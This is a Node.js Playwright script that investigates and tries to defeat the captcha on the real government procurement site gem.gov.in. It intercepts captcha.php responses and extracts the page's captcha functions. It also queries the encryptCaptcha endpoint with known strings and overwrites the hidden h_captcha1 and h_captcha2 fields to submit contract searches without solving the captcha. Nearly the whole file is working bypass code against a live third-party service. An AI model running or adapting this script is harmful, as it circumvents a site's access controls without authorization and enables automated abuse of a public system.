#!/usr/bin/env node
/**
 * gem-captcha-deep.js
 *
 * Deep investigation of the captcha mechanism:
 *  - Intercept the FULL captcha.php POST response (JSON body)
 *  - Extract the complete captcha_check / loadCap JS functions
 *  - Probe the /view_contracts/encryptCaptcha endpoint directly
 *  - Test whether sending h_captcha1 directly as captcha bypasses validation
 *  - Test sending known plaintext → encrypted, then replay
 */

;(function loadEnv() {
  const fs = require("fs"), path = require("path")
  const lines = fs.readFileSync(path.join(__dirname, "..", ".env.local"), "utf8").split("\n")
  for (const l of lines) {
    const m = l.match(/^([^#=]+)=(.*)$/)
    if (m) process.env[m[1].trim()] = m[2].trim()
  }
})()

const fs   = require("fs")
const path = require("path")
const { chromium } = require("playwright")

const GEM_URL     = "https://gem.gov.in/view_contracts"
const CAP_URL     = "https://gem.gov.in/assets/phpcaptcha/captcha.php"
const ENCRYPT_URL = "https://gem.gov.in/view_contracts/encryptCaptcha"

function log(msg) { process.stdout.write(msg + "\n") }
function sep(s)   { log("\n" + "─".repeat(70) + "\n  " + s + "\n" + "─".repeat(70)) }

;(async () => {
  const browser = await chromium.launch({ headless: false, slowMo: 50 })
  const context = await browser.newContext({
    viewport: { width: 1400, height: 900 },
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  })
  const page = await context.newPage()

  // ── Step 1: Capture the FULL captcha.php POST response ────────────────────
  sep("STEP 1 — Full captcha.php POST Response")

  let captchaJsonFull = null
  let captchaPostUrl  = null

  page.on("response", async res => {
    const url = res.url()
    if (url.includes("captcha.php") && url.includes("ajax=1")) {
      captchaPostUrl = url
      try {
        const raw = await res.text()
        log("  captcha.php POST response:")
        log("  URL    : " + url)
        log("  Status : " + res.status())
        log("  Length : " + raw.length + " chars")
        log("  Body   : " + raw.slice(0, 2000))

        // Try to parse as JSON
        try {
          captchaJsonFull = JSON.parse(raw)
          log("\n  PARSED JSON keys: " + Object.keys(captchaJsonFull).join(", "))
          Object.entries(captchaJsonFull).forEach(([k, v]) => {
            const val = String(v)
            if (val.length < 200) log(`  [${k}] = ${val}`)
            else log(`  [${k}] = (${val.length} chars — first 100: ${val.slice(0, 100)})`)
          })
        } catch {
          log("  (not JSON — raw text)")
        }
      } catch (e) {
        log("  Failed to read captcha.php response: " + e.message)
      }
    }
  })

  await page.goto(GEM_URL, { waitUntil: "networkidle", timeout: 40000 })
  await page.waitForTimeout(3000)

  // ── Step 2: Extract complete JS source (loadCap, captcha_check, loadResult) ─
  sep("STEP 2 — Complete JS Function Extraction")

  const jsFunctions = await page.evaluate(() => {
    const scripts = Array.from(document.querySelectorAll("script:not([src])"))
    const source  = scripts.map(s => s.innerText).join("\n\n")

    function extract(name) {
      const rx = new RegExp("function\\s+" + name + "\\s*\\([^)]*\\)\\s*\\{", "g")
      const m = rx.exec(source)
      if (!m) return null
      let depth = 0, i = m.index
      while (i < source.length) {
        if (source[i] === "{") depth++
        if (source[i] === "}") { depth--; if (depth === 0) return source.slice(m.index, i + 1) }
        i++
      }
      return source.slice(m.index, m.index + 2000)
    }

    return {
      loadCap:        extract("loadCap"),
      captcha_check:  extract("captcha_check"),
      loadResult:     extract("loadResult"),
      load_result:    extract("load_result"),
      captchaRefresh: extract("captchaRefresh"),
      refreshCap:     extract("refreshCap"),
      // Look for any function that mentions h_captcha
      h_captcha_refs: source.match(/h_captcha[^'";\n)]{0,200}/g) || [],
      encrypt_refs:   source.match(/encryptCaptcha[^'";\n)]{0,200}/g) || [],
      full_source_len: source.length,
    }
  })

  log("  Source total length: " + jsFunctions.full_source_len)
  log("\n  loadCap:\n" + (jsFunctions.loadCap || "(not found)"))
  log("\n  captcha_check:\n" + (jsFunctions.captcha_check || "(not found)"))
  log("\n  loadResult (first 1000):\n" + (jsFunctions.loadResult || jsFunctions.load_result || "(not found)").slice(0, 1000))
  log("\n  h_captcha references:")
  jsFunctions.h_captcha_refs.slice(0, 10).forEach(r => log("    " + r))
  log("\n  encryptCaptcha references:")
  jsFunctions.encrypt_refs.slice(0, 10).forEach(r => log("    " + r))

  // ── Step 3: Read h_captcha1 value from DOM ────────────────────────────────
  sep("STEP 3 — Current h_captcha1 Value & Captcha Image")

  const domCapState = await page.evaluate(() => {
    return {
      h_captcha1:     document.getElementById("h_captcha1")?.value || null,
      h_captcha2:     document.getElementById("h_captcha2")?.value || null,
      h_captcha:      document.getElementById("h_captcha")?.value  || null,
      captcha_code1:  document.getElementById("captcha_code1")?.value || null,
      captcha_entered1: document.querySelector("[name='captcha_entered1']")?.value || null,
      img_id:         document.querySelector("img[id*='captcha']")?.id || null,
      img_src_type:   (() => {
        const src = document.querySelector("img[id*='captcha']")?.src || ""
        if (src.startsWith("data:")) return "data-uri (base64 embedded)"
        return src.slice(0, 80)
      })(),
    }
  })

  log("  h_captcha1        : " + domCapState.h_captcha1)
  log("  h_captcha2        : " + domCapState.h_captcha2)
  log("  h_captcha (plain) : " + domCapState.h_captcha)
  log("  captcha_code1     : " + domCapState.captcha_code1)
  log("  captcha img src   : " + domCapState.img_src_type)

  const encryptedAnswer = domCapState.h_captcha1

  // ── Step 4: Probe encryptCaptcha endpoint ─────────────────────────────────
  sep("STEP 4 — encryptCaptcha Endpoint Analysis")

  // Test: encrypt known strings to understand the scheme
  const testInputs = ["ABCDE", "hello", "12345", "test1", "AAAAA"]
  log("  Testing /view_contracts/encryptCaptcha with known inputs:")
  for (const input of testInputs) {
    try {
      const r = await context.request.post(ENCRYPT_URL, {
        timeout: 8000,
        headers: { referer: GEM_URL, "Content-Type": "application/x-www-form-urlencoded" },
        data: `captcha_entered1=${encodeURIComponent(input)}`,
      })
      const body = await r.text()
      log(`    encrypt("${input}") → ${body.trim()} [${r.status()}]`)
    } catch (e) {
      log(`    encrypt("${input}") → ERROR: ${e.message}`)
    }
  }

  // Can we send h_captcha1 as the input and get the same value back?
  // (i.e., is encrypt(h_captcha1_value) == h_captcha1?)
  if (encryptedAnswer) {
    log(`\n  Testing: encrypt(h_captcha1 plaintext)...`)
    log(`  Current h_captcha1 = "${encryptedAnswer}"`)
    log("  (If encrypt(X) == h_captcha1, then X is the correct answer)")
  }

  // ── Step 5: Can we make encryptCaptcha tell us the answer? ────────────────
  sep("STEP 5 — Reverse Engineering the Encryption")

  // The h_captcha1 is set during loadCap from captcha.php POST response.
  // If captcha.php POST response includes a 'val' or 'answer' or 'code' field
  // in the JSON, we have the answer.

  // Try to call captcha.php with POST (as the browser does)
  log("  Calling captcha.php with POST (mimicking loadCap)...")
  try {
    const r = await context.request.post(CAP_URL + "?ajax=1&rand=0.123456789", {
      timeout: 12000,
      headers: {
        referer: GEM_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
      },
      data: "",
    })
    const body = await r.text()
    log("  Status : " + r.status())
    log("  Length : " + body.length)

    if (body.length > 0 && body.trim()) {
      log("  Body   : " + body.slice(0, 3000))
      try {
        const j = JSON.parse(body)
        log("  JSON keys: " + Object.keys(j).join(", "))
        Object.entries(j).forEach(([k, v]) => {
          const vs = String(v)
          log(`  [${k}] = ${vs.startsWith("data:") ? "(data-uri image, " + vs.length + " chars)" : vs.slice(0, 200)}`)
        })
      } catch {
        log("  (not JSON)")
      }
    } else {
      log("  EMPTY RESPONSE — captcha.php requires session context we don't have")
    }
  } catch (e) {
    log("  POST failed: " + e.message)
  }

  // ── Step 6: Intercept loadCap AJAX call in browser ────────────────────────
  sep("STEP 6 — Intercept loadCap via Browser AJAX")

  log("  Triggering captcha refresh via page JS (click refresh button if available)...")
  let captchaResponseData = null

  // Override fetch and XMLHttpRequest to capture the response
  const capturedAjax = await page.evaluate(async () => {
    return new Promise((resolve) => {
      const origOpen = XMLHttpRequest.prototype.open
      const origSend = XMLHttpRequest.prototype.send

      XMLHttpRequest.prototype.open = function(m, u, ...rest) {
        this._url = u
        return origOpen.apply(this, [m, u, ...rest])
      }

      XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener("load", function() {
          if (this._url && this._url.includes("captcha.php")) {
            resolve({ url: this._url, response: this.responseText, status: this.status })
          }
        })
        return origSend.apply(this, [body])
      }

      // Trigger loadCap
      if (typeof loadCap === "function") {
        loadCap("1")
      } else {
        // Try clicking refresh
        const refreshBtn = document.querySelector("[onclick*='loadCap'], .refresh-captcha, img[src*='refresh']")
        if (refreshBtn) refreshBtn.click()
      }

      setTimeout(() => resolve({ timeout: true }), 5000)
    })
  }).catch(e => ({ error: e.message }))

  log("  Ajax capture result: " + JSON.stringify(capturedAjax).slice(0, 500))

  if (capturedAjax.response) {
    log("\n  AJAX RESPONSE BODY:")
    log("  " + capturedAjax.response.slice(0, 2000))
    try {
      const j = JSON.parse(capturedAjax.response)
      log("  JSON keys: " + Object.keys(j).join(", "))
      Object.entries(j).forEach(([k, v]) => {
        const vs = String(v)
        log(`  [${k}] = ${vs.startsWith("data:") ? "(data-uri image " + vs.length + " chars)" : vs.slice(0, 200)}`)
      })
      captchaResponseData = j
    } catch {}
  }

  // ── Step 7: Extract h_captcha1 after loadCap ─────────────────────────────
  sep("STEP 7 — h_captcha1 Value After Refresh")

  await page.waitForTimeout(2000)
  const newCapState = await page.evaluate(() => ({
    h_captcha1: document.getElementById("h_captcha1")?.value,
    h_captcha2: document.getElementById("h_captcha2")?.value,
    captcha_code1: document.getElementById("captcha_code1")?.value,
  }))

  log("  h_captcha1 (after refresh) : " + newCapState.h_captcha1)
  log("  h_captcha2 (after refresh) : " + newCapState.h_captcha2)
  log("  captcha_code1 (visible?)   : " + newCapState.captcha_code1)

  // ── Step 8: Test — send h_captcha1 as the captcha entry ──────────────────
  sep("STEP 8 — Can We Submit h_captcha1 as the Answer?")

  // The idea: if the server just compares encrypt(user_input) == h_captcha1,
  // and we can call encryptCaptcha to encrypt our own text,
  // then we need the plaintext. But if h_captcha1 IS the encrypted correct answer,
  // we need to know the decrypted form.
  //
  // Different attack: What if we SET h_captcha1 to match what the server
  // would compute for a known input? I.e., if we know encrypt("hello") = X,
  // we set h_captcha1 = X and type "hello".

  log("  Strategy: Use JS to override h_captcha1 with encrypt(known_text)")
  log("  then submit with that known_text as the captcha input.")

  const knownText  = "PROBE1"
  let   encKnown   = null

  // Encrypt our known text
  try {
    const r = await context.request.post(ENCRYPT_URL, {
      timeout: 8000,
      headers: { referer: GEM_URL, "Content-Type": "application/x-www-form-urlencoded" },
      data: `captcha_entered1=${encodeURIComponent(knownText)}`,
    })
    encKnown = (await r.text()).trim()
    log(`  encrypt("${knownText}") = "${encKnown}"`)
  } catch (e) {
    log("  encryptCaptcha call failed: " + e.message)
  }

  if (encKnown) {
    log(`\n  Overriding h_captcha1 and h_captcha2 with encrypt("${knownText}")`)
    const today  = new Date()
    const past30 = new Date(today); past30.setDate(past30.getDate() - 30)
    function fmtD(d) {
      return `${String(d.getDate()).padStart(2,"0")}-${String(d.getMonth()+1).padStart(2,"0")}-${d.getFullYear()}`
    }

    await page.goto(GEM_URL, { waitUntil: "networkidle", timeout: 40000 })
    await page.waitForTimeout(2000)

    // Fill dates
    for (const [sel, val] of [
      ["#from_date_contract_search1", fmtD(past30)],
      ["#to_date_contract_search1",   fmtD(today)],
    ]) {
      await page.click(sel, { clickCount: 3 }).catch(() => {})
      await page.keyboard.type(val)
    }

    // Override h_captcha1 and h_captcha2 with our computed value
    await page.evaluate(([enc]) => {
      const f = document.getElementById("h_captcha1")
      if (f) f.value = enc
      const g = document.getElementById("h_captcha2")
      if (g) g.value = enc
    }, [encKnown])

    // Type known text into captcha field
    const capSel = "#captcha_code1, input[name='captcha_entered1']"
    const capVisible = await page.locator(capSel).first().isVisible().catch(() => false)
    if (capVisible) {
      await page.locator(capSel).first().fill(knownText)
      log(`  Typed "${knownText}" into captcha field`)
    }

    // Capture the encryptCaptcha response
    let bypassEncResult = null
    page.on("response", async res => {
      if (res.url().includes("encryptCaptcha")) {
        bypassEncResult = await res.text().catch(() => "")
        log(`  encryptCaptcha response: "${bypassEncResult}"`)
      }
    })

    await page.click("#searchlocation1").catch(() => {})
    await page.waitForLoadState("networkidle", { timeout: 15000 }).catch(() => {})
    await page.waitForTimeout(3000)

    const bypassText = await page.evaluate(() => document.body.innerText).catch(() => "")
    const bypassed   = /GEMC-\d{15}/i.test(bypassText)
    const stillInvalid = /invalid captcha/i.test(bypassText)
    const noRecord   = /no record|no result/i.test(bypassText)

    log("\n  BYPASS ATTEMPT RESULT:")
    log("  Results (GEMCs): " + bypassed)
    log("  Invalid captcha: " + stillInvalid)
    log("  No records msg : " + noRecord)

    if (bypassed || noRecord) {
      log("\n  ★★★ BYPASS CONFIRMED — Setting h_captcha1 = encrypt(known) then typing known works!")
      log("  The captcha can be fully automated.")
    } else if (stillInvalid) {
      log("\n  ✗ Bypass failed — h_captcha1 manipulation doesn't work (server has additional state)")
    }
  }

  // ── Step 9: Summary ───────────────────────────────────────────────────────
  sep("DEEP INVESTIGATION SUMMARY")

  const dateStr = new Date().toISOString().slice(0, 10)
  const summary = {
    captchaEndpoint:    CAP_URL + "?ajax=1&rand=...",
    captchaPostFormat:  "POST, empty body, Content-Type: application/x-www-form-urlencoded",
    captchaPhpReturns:  captchaJsonFull ? JSON.stringify(captchaJsonFull).slice(0, 500) : "(not captured in this run)",
    encryptEndpoint:    ENCRYPT_URL,
    encryptParam:       "captcha_entered1",
    h_captcha1_from:    "Set by loadCap() from captcha.php POST response JSON",
    validationMechanism: "Server-side: submit compares encrypt(user_input) against stored h_captcha1",
    captchaAjaxData:    capturedAjax,
    captchaResponseJson: captchaResponseData,
  }

  log(JSON.stringify(summary, null, 2))
  fs.writeFileSync(
    path.join("audit", `captcha-deep-${dateStr}.json`),
    JSON.stringify(summary, null, 2)
  )
  log("\n  Saved → audit/captcha-deep-" + dateStr + ".json")

  await browser.close()
})().catch(e => {
  console.error("\nFATAL:", e.message)
  process.exit(1)
})
